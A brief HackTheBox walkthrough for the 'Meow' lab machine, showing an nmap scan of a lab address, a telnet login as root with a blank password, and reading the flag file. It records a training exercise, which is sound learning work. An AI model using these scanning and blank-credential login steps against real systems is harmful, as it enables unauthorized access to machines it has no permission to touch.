# Meow – HackTheBox Writeup

## Machine Information

Difficulty: Very Easy  
OS: Linux  

---

## Enumeration

Command:

nmap -sC -sV 10.129.3.15

Result:

PORT 23/tcp open telnet

---

## Exploitation

Command:

telnet -l root 10.129.3.15

Login attempt:

username: root
password: blank

Access granted.

---

## Flag

cat flag.txt
